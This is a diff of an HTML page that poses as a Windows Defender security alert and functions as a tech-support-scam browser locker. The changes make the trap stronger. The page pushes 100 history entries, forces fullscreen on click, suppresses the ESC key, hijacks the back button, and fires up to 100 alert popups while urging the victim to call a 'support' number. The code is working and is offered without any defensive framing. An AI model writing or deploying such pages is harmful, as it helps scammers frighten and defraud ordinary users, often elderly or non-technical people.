@@ -3,15 +3,16 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Windows Security Alert</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Security Lock - Fullscreen Trap</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
       padding: 0;
       background-color: #000;
       color: #fff;
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
+      text-align: center;
       overflow: hidden;
     }
     .overlay {
@@ -19,38 +20,46 @@
       top: 0; left: 0;
       width: 100%; height: 100%;
       background: #111;
-      z-index: 9999;
+      z-index: 99999;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      text-align: center;
       padding: 20px;
     }
     h1 {
       color: red;
+      font-size: 24px;
     }
     p {
       font-size: 16px;
-      margin: 10px 0;
+      margin-top: 10px;
     }
   </style>
   <script>
     let alertFlood = true;
+    let alertCount = 0;
 
-    // Deep history stack
+    // Fill history stack
     for (let i = 0; i < 100; i++) {
       history.pushState({}, '', location.href + '#' + i);
     }
 
-    // Lock fullscreen
-    document.addEventListener("click", function () {
-      let el = document.documentElement;
+    // Force fullscreen on click
+    document.addEventListener("click", () => {
+      const el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
     });
 
-    // Trap back button
+    // Lock ESC key
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
+        e.preventDefault();
+      }
+    });
+
+    // Handle back button
     window.onpopstate = function () {
       if (alertFlood) {
         alertFlood = false;
@@ -59,29 +68,28 @@
     };
 
     function showAlerts(n) {
-      if (n >= 30) return;
+      if (n >= 100) {
+        alert("✅ You may now exit.");
+        return;
+      }
       setTimeout(() => {
-        alert(`⚠️ Alert ${n + 1}/30: Security breach detected!`);
+        alertCount++;
+        alert(`🚫 Alert ${alertCount}/100:
+Security lock in place.`);
         history.pushState({}, '', location.href + '#' + Math.random());
         showAlerts(n + 1);
       }, 200);
     }
-
-    // Prevent escape with ESC key (some browsers)
-    document.addEventListener('keydown', function(e) {
-      if (e.key === 'Escape') {
-        e.preventDefault();
-      }
-    });
   </script>
 </head>
 <body>
   <div class="overlay">
-    <h1>⚠️ Windows Defender - Security Alert</h1>
-    <p>Your device has been locked due to a critical threat.</p>
-    <p>Call Microsoft Support immediately: <strong>+1-800-FAKE-NUM</strong></p>
-    <p>Do not press back or close this window.</p>
-    <p>Full screen mode active. Touch anywhere to continue.</p>
+    <h1>⚠️ Windows Defender - Critical Alert</h1>
+    <p>Your system is at risk.</p>
+    <p>Call support immediately: <strong>+1-800-FAKE-NUM</strong></p>
+    <p>Do not press back or close this screen.</p>
+    <p><strong>Full screen mode will remain locked until 100 warnings are shown.</strong></p>
+    <p>Tap anywhere to activate fullscreen.</p>
   </div>
 </body>
 </html>
